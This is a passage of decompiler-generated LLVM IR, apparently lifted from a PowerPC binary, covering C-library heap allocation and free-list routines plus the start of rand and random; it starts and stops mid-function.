  %v1_1000e6ac = add i32 %v0_1000e6ac, 28
  %v3_1000e6b0 = icmp ugt i32 %v1_1000e6ac, %v3_1000e61c
  br i1 %v3_1000e6b0, label %dec_label_pc_1000e6e8, label %dec_label_pc_1000e6b8

dec_label_pc_1000e6b8:                            ; preds = %dec_label_pc_1000e6ac
  store i32 ptrtoint (i32* @global_var_10034878.878 to i32), i32* @r29, align 4
  %v0_1000e6c4 = call i32 @__pthread_return_0()
  %v0_1000e6cc = load i32, i32* %r27.global-to-local, align 4
  %v1_1000e6cc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e6cc = add i32 %v1_1000e6cc, %v0_1000e6cc
  %v1_1000e6d0 = load i32, i32* @r30, align 4
  %v2_1000e6d0 = sub i32 %v1_1000e6d0, %v1_1000e6cc
  store i32 268494556, i32* @lr, align 4
  %v4_1000e6d8 = call i32 @__heap_free(i32* nonnull @global_var_1002e5d8, i32 %v2_1000e6cc, i32 %v2_1000e6d0)
  %v0_1000e6e0 = call i32 @__pthread_return_0()
  %v0_1000e6e4 = load i32, i32* @r31, align 4
  %v1_1000e6e4 = load i32, i32* @r28, align 4
  %v2_1000e6e4 = add i32 %v1_1000e6e4, -4
  %v3_1000e6e4 = inttoptr i32 %v2_1000e6e4 to i32*
  store i32 %v0_1000e6e4, i32* %v3_1000e6e4, align 4
  br label %dec_label_pc_1000e6e8

dec_label_pc_1000e6e8:                            ; preds = %dec_label_pc_1000e6ac, %dec_label_pc_1000e690, %dec_label_pc_1000e688, %dec_label_pc_1000e66c, %dec_label_pc_1000e604, %dec_label_pc_1000e6b8
  %v0_1000e6ec = load i32, i32* @r28, align 4
  ret i32 %v0_1000e6ec

; uselistorder directives
  uselistorder i32 %v1_1000e6cc, { 1, 0 }
  uselistorder i32 %v4_1000e654, { 1, 0, 2 }
  uselistorder i32 %v1_1000e648, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_1002e5d8, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000e6e8, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000e62c, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_1000e700 = inttoptr i32 %arg2 to i32*
  %v2_1000e700 = load i32, i32* %v1_1000e700, align 4
  %v1_1000e704 = add i32 %v2_1000e700, 3
  store i32 %v1_1000e704, i32* %r9.global-to-local, align 4
  %v1_1000e708 = call i32 @__asm_rlwinm(i32 %v1_1000e704, i32 0, i32 0, i32 29)
  %v2_1000e70c = icmp ugt i32 %v1_1000e708, 11
  br i1 %v2_1000e70c, label %dec_label_pc_1000e790.preheader, label %dec_label_pc_1000e714

dec_label_pc_1000e714:                            ; preds = %entry
  br label %dec_label_pc_1000e790.preheader

dec_label_pc_1000e790.preheader:                  ; preds = %entry, %dec_label_pc_1000e714
  %storemerge20 = phi i32 [ 12, %dec_label_pc_1000e714 ], [ %v1_1000e708, %entry ]
  %v0_1000e774 = phi i32 [ 12, %dec_label_pc_1000e714 ], [ %v1_1000e708, %entry ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_1000e7905 = icmp eq i32 %storemerge2, 0
  br i1 %v3_1000e7905, label %dec_label_pc_1000e798, label %dec_label_pc_1000e720

dec_label_pc_1000e720:                            ; preds = %dec_label_pc_1000e790.preheader, %dec_label_pc_1000e78c
  %v0_1000e78c = phi i32 [ %storemerge, %dec_label_pc_1000e78c ], [ %storemerge2, %dec_label_pc_1000e790.preheader ]
  %v1_1000e720 = inttoptr i32 %v0_1000e78c to i32*
  %v2_1000e720 = load i32, i32* %v1_1000e720, align 4
  store i32 %v2_1000e720, i32* %r10.global-to-local, align 4
  %v2_1000e724 = icmp ult i32 %v2_1000e720, %v0_1000e774
  br i1 %v2_1000e724, label %dec_label_pc_1000e78c, label %dec_label_pc_1000e72c

dec_label_pc_1000e72c:                            ; preds = %dec_label_pc_1000e720
  %v1_1000e72c = add i32 %v0_1000e774, 44
  %v2_1000e730 = icmp ult i32 %v2_1000e720, %v1_1000e72c
  br i1 %v2_1000e730, label %dec_label_pc_1000e738, label %dec_label_pc_1000e774

dec_label_pc_1000e738:                            ; preds = %dec_label_pc_1000e72c
  %v1_1000e738 = add i32 %v0_1000e78c, 4
  %v2_1000e738 = inttoptr i32 %v1_1000e738 to i32*
  %v3_1000e738 = load i32, i32* %v2_1000e738, align 4
  store i32 %v3_1000e738, i32* %r11.global-to-local, align 4
  %v3_1000e73c = icmp eq i32 %v3_1000e738, 0
  br i1 %v3_1000e73c, label %dec_label_pc_1000e74c, label %dec_label_pc_1000e744

dec_label_pc_1000e744:                            ; preds = %dec_label_pc_1000e738
  %v1_1000e744 = add i32 %v0_1000e78c, 8
  %v2_1000e744 = inttoptr i32 %v1_1000e744 to i32*
  %v3_1000e744 = load i32, i32* %v2_1000e744, align 4
  %v2_1000e748 = add i32 %v3_1000e738, 8
  %v3_1000e748 = inttoptr i32 %v2_1000e748 to i32*
  store i32 %v3_1000e744, i32* %v3_1000e748, align 4
  %v0_1000e74c.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1000e768.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000e74c

dec_label_pc_1000e74c:                            ; preds = %dec_label_pc_1000e738, %dec_label_pc_1000e744
  %v0_1000e768 = phi i32 [ %v2_1000e720, %dec_label_pc_1000e738 ], [ %v0_1000e768.pre, %dec_label_pc_1000e744 ]
  %v0_1000e74c = phi i32 [ %v0_1000e78c, %dec_label_pc_1000e738 ], [ %v0_1000e74c.pre, %dec_label_pc_1000e744 ]
  %v1_1000e74c = add i32 %v0_1000e74c, 8
  %v2_1000e74c = inttoptr i32 %v1_1000e74c to i32*
  %v3_1000e74c = load i32, i32* %v2_1000e74c, align 4
  store i32 %v3_1000e74c, i32* @r8, align 4
  %v1_1000e750 = add i32 %v0_1000e74c, 4
  %v2_1000e750 = inttoptr i32 %v1_1000e750 to i32*
  %v3_1000e750 = load i32, i32* %v2_1000e750, align 4
  %v3_1000e754 = icmp eq i32 %v3_1000e74c, 0
  store i32 %v0_1000e768, i32* %r11.global-to-local, align 4
  br i1 %v3_1000e754, label %dec_label_pc_1000e768, label %dec_label_pc_1000e75c

dec_label_pc_1000e75c:                            ; preds = %dec_label_pc_1000e74c
  %v2_1000e760 = add i32 %v3_1000e74c, 4
  %v3_1000e760 = inttoptr i32 %v2_1000e760 to i32*
  store i32 %v3_1000e750, i32* %v3_1000e760, align 4
  br label %dec_label_pc_1000e77c

dec_label_pc_1000e768:                            ; preds = %dec_label_pc_1000e74c
  store i32 %v3_1000e750, i32* %arg1, align 4
  br label %dec_label_pc_1000e77c

dec_label_pc_1000e774:                            ; preds = %dec_label_pc_1000e72c
  %v2_1000e774 = sub i32 %v2_1000e720, %v0_1000e774
  store i32 %v2_1000e774, i32* %v1_1000e720, align 4
  br label %dec_label_pc_1000e77c

dec_label_pc_1000e77c:                            ; preds = %dec_label_pc_1000e768, %dec_label_pc_1000e75c, %dec_label_pc_1000e774
  %v0_1000e77c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e77c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000e77c = sub i32 %v1_1000e77c, %v0_1000e77c
  store i32 %v2_1000e77c, i32* %r9.global-to-local, align 4
  %v0_1000e780 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000e780, i32* %v1_1000e700, align 4
  %v0_1000e784 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e784 = add i32 %v0_1000e784, 12
  ret i32 %v1_1000e784

dec_label_pc_1000e78c:                            ; preds = %dec_label_pc_1000e720
  %v1_1000e78c = add i32 %v0_1000e78c, 4
  %storemerge.in = inttoptr i32 %v1_1000e78c to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_1000e790 = icmp eq i32 %storemerge, 0
  br i1 %v3_1000e790, label %dec_label_pc_1000e790.dec_label_pc_1000e798_crit_edge, label %dec_label_pc_1000e720

dec_label_pc_1000e790.dec_label_pc_1000e798_crit_edge: ; preds = %dec_label_pc_1000e78c
  br label %dec_label_pc_1000e798

dec_label_pc_1000e798:                            ; preds = %dec_label_pc_1000e790.dec_label_pc_1000e798_crit_edge, %dec_label_pc_1000e790.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1000e74c, { 1, 0 }
  uselistorder i32 %v2_1000e720, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1000e78c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_1000e774, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 4, 5, 2, 1, 3, 6 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000e77c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e74c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e720, { 1, 0 }
  uselistorder label %dec_label_pc_1000e790.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1000e7a0 = load i32, i32* %arg1, align 4
  store i32 %v2_1000e7a0, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* @r8, align 4
  %v1_1000e7a8 = add i32 %arg3, 3
  %v3_1000e82c3 = icmp eq i32 %v2_1000e7a0, 0
  br i1 %v3_1000e82c3, label %dec_label_pc_1000e834, label %dec_label_pc_1000e7b0

dec_label_pc_1000e7b0:                            ; preds = %entry, %dec_label_pc_1000e828
  %v0_1000e828 = phi i32 [ %v3_1000e828, %dec_label_pc_1000e828 ], [ %v2_1000e7a0, %entry ]
  %v1_1000e7b0 = inttoptr i32 %v0_1000e828 to i32*
  %v2_1000e7b0 = load i32, i32* %v1_1000e7b0, align 4
  %v2_1000e7b4 = sub i32 %v0_1000e828, %v2_1000e7b0
  %v1_1000e7b8 = add i32 %v2_1000e7b4, 12
  %v3_1000e7bc = icmp ugt i32 %v1_1000e7b8, %arg2
  br i1 %v3_1000e7bc, label %dec_label_pc_1000e828, label %dec_label_pc_1000e7c4

dec_label_pc_1000e7c4:                            ; preds = %dec_label_pc_1000e7b0
  %v4_1000e7bc = icmp eq i32 %v1_1000e7b8, %arg2
  br i1 %v4_1000e7bc, label %dec_label_pc_1000e7cc, label %dec_label_pc_1000e834

dec_label_pc_1000e7cc:                            ; preds = %dec_label_pc_1000e7c4
  %v1_1000e7cc = call i32 @__asm_rlwinm(i32 %v1_1000e7a8, i32 0, i32 0, i32 29)
  %v2_1000e7d0 = icmp ult i32 %v2_1000e7b0, %v1_1000e7cc
  br i1 %v2_1000e7d0, label %dec_label_pc_1000e834, label %dec_label_pc_1000e7d8

dec_label_pc_1000e7d8:                            ; preds = %dec_label_pc_1000e7cc
  %v1_1000e7d8 = add i32 %v1_1000e7cc, 44
  %v2_1000e7dc = icmp ult i32 %v2_1000e7b0, %v1_1000e7d8
  br i1 %v2_1000e7dc, label %dec_label_pc_1000e7e4, label %dec_label_pc_1000e818

dec_label_pc_1000e7e4:                            ; preds = %dec_label_pc_1000e7d8
  %v0_1000e7e4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e7e4 = add i32 %v0_1000e7e4, 4
  %v2_1000e7e4 = inttoptr i32 %v1_1000e7e4 to i32*
  %v3_1000e7e4 = load i32, i32* %v2_1000e7e4, align 4
  %v3_1000e7e8 = icmp eq i32 %v3_1000e7e4, 0
  br i1 %v3_1000e7e8, label %dec_label_pc_1000e7f8, label %dec_label_pc_1000e7f0

dec_label_pc_1000e7f0:                            ; preds = %dec_label_pc_1000e7e4
  %v1_1000e7f0 = add i32 %v0_1000e7e4, 8
  %v2_1000e7f0 = inttoptr i32 %v1_1000e7f0 to i32*
  %v3_1000e7f0 = load i32, i32* %v2_1000e7f0, align 4
  %v2_1000e7f4 = add i32 %v3_1000e7e4, 8
  %v3_1000e7f4 = inttoptr i32 %v2_1000e7f4 to i32*
  store i32 %v3_1000e7f0, i32* %v3_1000e7f4, align 4
  %v0_1000e7f8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e7f8

dec_label_pc_1000e7f8:                            ; preds = %dec_label_pc_1000e7e4, %dec_label_pc_1000e7f0
  %v0_1000e7f8 = phi i32 [ %v0_1000e7e4, %dec_label_pc_1000e7e4 ], [ %v0_1000e7f8.pre, %dec_label_pc_1000e7f0 ]
  %v1_1000e7f8 = add i32 %v0_1000e7f8, 8
  %v2_1000e7f8 = inttoptr i32 %v1_1000e7f8 to i32*
  %v3_1000e7f8 = load i32, i32* %v2_1000e7f8, align 4
  %v1_1000e7fc = add i32 %v0_1000e7f8, 4
  %v2_1000e7fc = inttoptr i32 %v1_1000e7fc to i32*
  %v3_1000e7fc = load i32, i32* %v2_1000e7fc, align 4
  %v3_1000e800 = icmp eq i32 %v3_1000e7f8, 0
  br i1 %v3_1000e800, label %dec_label_pc_1000e810, label %dec_label_pc_1000e808

dec_label_pc_1000e808:                            ; preds = %dec_label_pc_1000e7f8
  %v2_1000e808 = add i32 %v3_1000e7f8, 4
  %v3_1000e808 = inttoptr i32 %v2_1000e808 to i32*
  store i32 %v3_1000e7fc, i32* %v3_1000e808, align 4
  ret i32 %v2_1000e7b0

dec_label_pc_1000e810:                            ; preds = %dec_label_pc_1000e7f8
  %v1_1000e810 = load i32, i32* @r8, align 4
  %v2_1000e810 = inttoptr i32 %v1_1000e810 to i32*
  store i32 %v3_1000e7fc, i32* %v2_1000e810, align 4
  ret i32 %v2_1000e7b0

dec_label_pc_1000e818:                            ; preds = %dec_label_pc_1000e7d8
  %v2_1000e818 = sub i32 %v2_1000e7b0, %v1_1000e7cc
  %v1_1000e820 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000e820 = inttoptr i32 %v1_1000e820 to i32*
  store i32 %v2_1000e818, i32* %v2_1000e820, align 4
  ret i32 %v1_1000e7cc

dec_label_pc_1000e828:                            ; preds = %dec_label_pc_1000e7b0
  %v1_1000e828 = add i32 %v0_1000e828, 4
  %v2_1000e828 = inttoptr i32 %v1_1000e828 to i32*
  %v3_1000e828 = load i32, i32* %v2_1000e828, align 4
  store i32 %v3_1000e828, i32* %r11.global-to-local, align 4
  %v3_1000e82c = icmp eq i32 %v3_1000e828, 0
  br i1 %v3_1000e82c, label %dec_label_pc_1000e82c.dec_label_pc_1000e834.loopexit_crit_edge, label %dec_label_pc_1000e7b0

dec_label_pc_1000e82c.dec_label_pc_1000e834.loopexit_crit_edge: ; preds = %dec_label_pc_1000e828
  br label %dec_label_pc_1000e834

dec_label_pc_1000e834:                            ; preds = %entry, %dec_label_pc_1000e82c.dec_label_pc_1000e834.loopexit_crit_edge, %dec_label_pc_1000e7c4, %dec_label_pc_1000e7cc
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_1000e828, { 1, 2, 0 }
  uselistorder i32 %v0_1000e7f8, { 1, 0 }
  uselistorder i32 %v1_1000e7cc, { 2, 1, 0, 3 }
  uselistorder i32 %v2_1000e7b0, { 4, 3, 2, 0, 1, 5 }
  uselistorder i32 %v0_1000e828, { 0, 2, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000e834, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_1000e7f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e7b0, { 1, 0 }
}

define i32 @__heap_link_free_area(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000e83c = icmp eq i32 %arg3, 0
  %v2_1000e840 = add i32 %arg2, 4
  %v3_1000e840 = inttoptr i32 %v2_1000e840 to i32*
  store i32 %arg4, i32* %v3_1000e840, align 4
  %v2_1000e844 = add i32 %arg2, 8
  %v3_1000e844 = inttoptr i32 %v2_1000e844 to i32*
  store i32 %arg3, i32* %v3_1000e844, align 4
  br i1 %v3_1000e83c, label %dec_label_pc_1000e854, label %dec_label_pc_1000e84c

dec_label_pc_1000e84c:                            ; preds = %entry
  %v2_1000e84c = add i32 %arg3, 4
  %v3_1000e84c = inttoptr i32 %v2_1000e84c to i32*
  store i32 %arg2, i32* %v3_1000e84c, align 4
  br label %dec_label_pc_1000e858

dec_label_pc_1000e854:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000e858

dec_label_pc_1000e858:                            ; preds = %dec_label_pc_1000e84c, %dec_label_pc_1000e854
  %v3_1000e858 = icmp eq i32 %arg4, 0
  %v0_1000e85c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e858, i32 %v0_1000e85c)
  %v2_1000e860 = add i32 %arg4, 8
  %v3_1000e860 = inttoptr i32 %v2_1000e860 to i32*
  store i32 %arg2, i32* %v3_1000e860, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_1000e858, { 1, 0 }
}

define i32 @__heap_link_free_area_after(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000e868 = icmp eq i32 %arg3, 0
  br i1 %v3_1000e868, label %dec_label_pc_1000e878, label %dec_label_pc_1000e870

dec_label_pc_1000e870:                            ; preds = %entry
  %v2_1000e870 = add i32 %arg3, 4
  %v3_1000e870 = inttoptr i32 %v2_1000e870 to i32*
  store i32 %arg2, i32* %v3_1000e870, align 4
  br label %dec_label_pc_1000e87c

dec_label_pc_1000e878:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000e87c

dec_label_pc_1000e87c:                            ; preds = %dec_label_pc_1000e870, %dec_label_pc_1000e878
  %v2_1000e87c = add i32 %arg2, 8
  %v3_1000e87c = inttoptr i32 %v2_1000e87c to i32*
  store i32 %arg3, i32* %v3_1000e87c, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e87c, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_1000e89c = load i32, i32* %arg1, align 4
  store i32 %v2_1000e89c, i32* @r31, align 4
  %v2_1000e8a0 = add i32 %arg3, %arg2
  store i32 %v2_1000e8a0, i32* %r3.global-to-local, align 4
  %v3_1000e8b47 = icmp eq i32 %v2_1000e89c, 0
  %v1_1000e8b88 = add i32 %v2_1000e89c, 12
  %tmp69 = icmp uge i32 %v1_1000e8b88, %arg2
  %or.cond10 = or i1 %v3_1000e8b47, %tmp69
  br i1 %or.cond10, label %dec_label_pc_1000e8c4, label %dec_label_pc_1000e8ac

dec_label_pc_1000e8ac:                            ; preds = %entry, %dec_label_pc_1000e8ac
  %v0_1000e90c11 = phi i32 [ %v3_1000e8b0, %dec_label_pc_1000e8ac ], [ %v2_1000e89c, %entry ]
  store i32 %v0_1000e90c11, i32* %r11.global-to-local, align 4
  %v1_1000e8b0 = add i32 %v0_1000e90c11, 4
  %v2_1000e8b0 = inttoptr i32 %v1_1000e8b0 to i32*
  %v3_1000e8b0 = load i32, i32* %v2_1000e8b0, align 4
  store i32 %v3_1000e8b0, i32* @r31, align 4
  %v3_1000e8b4 = icmp eq i32 %v3_1000e8b0, 0
  %v1_1000e8b8 = add i32 %v3_1000e8b0, 12
  %tmp6 = icmp uge i32 %v1_1000e8b8, %arg2
  %or.cond = or i1 %v3_1000e8b4, %tmp6
  br i1 %or.cond, label %dec_label_pc_1000e8c4, label %dec_label_pc_1000e8ac

dec_label_pc_1000e8c4:                            ; preds = %dec_label_pc_1000e8ac, %entry
  %v0_1000e900.lcssa = phi i32 [ 0, %entry ], [ %v0_1000e90c11, %dec_label_pc_1000e8ac ]
  %v0_1000e90c.lcssa = phi i32 [ %v2_1000e89c, %entry ], [ %v3_1000e8b0, %dec_label_pc_1000e8ac ]
  %v3_1000e8b4.lcssa = phi i1 [ %v3_1000e8b47, %entry ], [ %v3_1000e8b4, %dec_label_pc_1000e8ac ]
  br i1 %v3_1000e8b4.lcssa, label %dec_label_pc_1000e97c, label %dec_label_pc_1000e8cc

dec_label_pc_1000e8cc:                            ; preds = %dec_label_pc_1000e8c4
  %v1_1000e8cc = inttoptr i32 %v0_1000e90c.lcssa to i32*
  %v2_1000e8cc = load i32, i32* %v1_1000e8cc, align 4
  %v2_1000e8d0 = sub i32 %v0_1000e90c.lcssa, %v2_1000e8cc
  %v1_1000e8d4 = add i32 %v2_1000e8d0, 12
  %v3_1000e8d8 = icmp ugt i32 %v1_1000e8d4, %v2_1000e8a0
  br i1 %v3_1000e8d8, label %dec_label_pc_1000e97c, label %dec_label_pc_1000e8e0

dec_label_pc_1000e8e0:                            ; preds = %dec_label_pc_1000e8cc
  %v4_1000e8d8 = icmp eq i32 %v1_1000e8d4, %v2_1000e8a0
  %v2_1000e8e4 = add i32 %v2_1000e8cc, %arg3
  store i32 %v2_1000e8e4, i32* @r29, align 4
  br i1 %v4_1000e8d8, label %dec_label_pc_1000e8ec, label %dec_label_pc_1000e91c

dec_label_pc_1000e8ec:                            ; preds = %dec_label_pc_1000e8e0
  %v3_1000e8ec = icmp eq i32 %v0_1000e900.lcssa, 0
  br i1 %v3_1000e8ec, label %dec_label_pc_1000e970, label %dec_label_pc_1000e8f4

dec_label_pc_1000e8f4:                            ; preds = %dec_label_pc_1000e8ec
  %v1_1000e8f4 = add i32 %v0_1000e900.lcssa, 12
  %v4_1000e8f8 = icmp eq i32 %v1_1000e8f4, %arg2
  br i1 %v4_1000e8f8, label %dec_label_pc_1000e900, label %dec_label_pc_1000e970

dec_label_pc_1000e900:                            ; preds = %dec_label_pc_1000e8f4
  %v1_1000e900 = inttoptr i32 %v0_1000e900.lcssa to i32*
  %v2_1000e900 = load i32, i32* %v1_1000e900, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_1000e908 = add i32 %v0_1000e900.lcssa, 8
  %v2_1000e908 = inttoptr i32 %v1_1000e908 to i32*
  %v3_1000e908 = load i32, i32* %v2_1000e908, align 4
  %v2_1000e910 = add i32 %v2_1000e900, %v2_1000e8e4
  store i32 %v2_1000e910, i32* @r29, align 4
  %v5_1000e914 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v0_1000e90c.lcssa, i32 %v3_1000e908, i32 %v2_1000e8a0)
  store i32 %v5_1000e914, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e970

dec_label_pc_1000e91c:                            ; preds = %dec_label_pc_1000e8e0
  %v1_1000e91c = add i32 %v0_1000e90c.lcssa, 4
  %v2_1000e91c = inttoptr i32 %v1_1000e91c to i32*
  %v3_1000e91c = load i32, i32* %v2_1000e91c, align 4
  %v3_1000e920 = icmp eq i32 %v3_1000e91c, 0
  br i1 %v3_1000e920, label %dec_label_pc_1000e958, label %dec_label_pc_1000e928

dec_label_pc_1000e928:                            ; preds = %dec_label_pc_1000e91c
  %v1_1000e928 = inttoptr i32 %v3_1000e91c to i32*
  %v2_1000e928 = load i32, i32* %v1_1000e928, align 4
  %v2_1000e92c = sub i32 %v3_1000e91c, %v2_1000e928
  %v1_1000e930 = add i32 %v2_1000e92c, 12
  %v4_1000e934 = icmp eq i32 %v2_1000e8a0, %v1_1000e930
  br i1 %v4_1000e934, label %dec_label_pc_1000e93c, label %dec_label_pc_1000e958

dec_label_pc_1000e93c:                            ; preds = %dec_label_pc_1000e928
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1000e948 = add i32 %v2_1000e928, %v2_1000e8e4
  store i32 %v2_1000e948, i32* @r29, align 4
  store i32 %v3_1000e91c, i32* @r31, align 4
  %v5_1000e950 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v3_1000e91c, i32 %v0_1000e900.lcssa, i32 %v2_1000e8a0)
  store i32 %v5_1000e950, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e970

dec_label_pc_1000e958:                            ; preds = %dec_label_pc_1000e928, %dec_label_pc_1000e91c
  %v2_1000e958 = add i32 %v0_1000e90c.lcssa, %arg3
  store i32 %v2_1000e958, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268495216, i32* @lr, align 4
  %v5_1000e96c = call i32 @__heap_link_free_area(i32* %arg1, i32 %v2_1000e958, i32 %v0_1000e900.lcssa, i32 %v3_1000e91c)
  store i32 %v5_1000e96c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e970

dec_label_pc_1000e970:                            ; preds = %dec_label_pc_1000e8f4, %dec_label_pc_1000e8ec, %dec_label_pc_1000e93c, %dec_label_pc_1000e900, %dec_label_pc_1000e958
  %v0_1000e970 = load i32, i32* @r31, align 4
  store i32 %v0_1000e970, i32* @r30, align 4
  %v0_1000e974 = load i32, i32* @r29, align 4
  %v2_1000e974 = inttoptr i32 %v0_1000e970 to i32*
  store i32 %v0_1000e974, i32* %v2_1000e974, align 4
  br label %dec_label_pc_1000e998

dec_label_pc_1000e97c:                            ; preds = %dec_label_pc_1000e8cc, %dec_label_pc_1000e8c4
  %v2_1000e97c = add i32 %v2_1000e8a0, -12
  %v3_1000e97c = inttoptr i32 %v2_1000e97c to i32*
  store i32 %arg3, i32* %v3_1000e97c, align 4
  %v0_1000e980 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000e980 = add i32 %v0_1000e980, -12
  store i32 %v1_1000e980, i32* @r30, align 4
  %v0_1000e984 = load i32, i32* %r11.global-to-local, align 4
  %v0_1000e988 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000e988, i32* %r3.global-to-local, align 4
  %v0_1000e98c = load i32, i32* @r31, align 4
  store i32 268495256, i32* @lr, align 4
  %v4_1000e994 = inttoptr i32 %v0_1000e988 to i32*
  %v5_1000e994 = call i32 @__heap_link_free_area(i32* %v4_1000e994, i32 %v1_1000e980, i32 %v0_1000e984, i32 %v0_1000e98c)
  store i32 %v5_1000e994, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e998

dec_label_pc_1000e998:                            ; preds = %dec_label_pc_1000e970, %dec_label_pc_1000e97c
  %v0_1000e99c = load i32, i32* @r30, align 4
  store i32 %v0_1000e99c, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000e99c

; uselistorder directives
  uselistorder i32 %v3_1000e91c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1000e8d4, { 1, 0 }
  uselistorder i32 %v0_1000e90c.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1000e900.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_1000e8b0, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_1000e8a0, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 8, 2, 6, 9, 3, 10, 4, 11, 5, 7, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 -12, { 2, 3, 1, 4, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000e998, { 1, 0 }
  uselistorder label %dec_label_pc_1000e970, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000e8ac, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_1000e9b0 = call i32 @random()
  ret i32 %v0_1000e9b0

; uselistorder directives
  uselistorder i32 ()* @random, { 13, 12, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_1000e9c8 = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_1002e4a0.887 to i32), i32* @r29, align 4
  store i32 %v2_1000e9c8, i32* @r3, align 4
  %v0_1000e9e0 = call i32 @__pthread_return_void()
  %v0_1000e9e8 = call i32 @__pthread_return_0()
  %v2_1000e9f0 = ptrtoint i32* %stack_var_-56 to i32
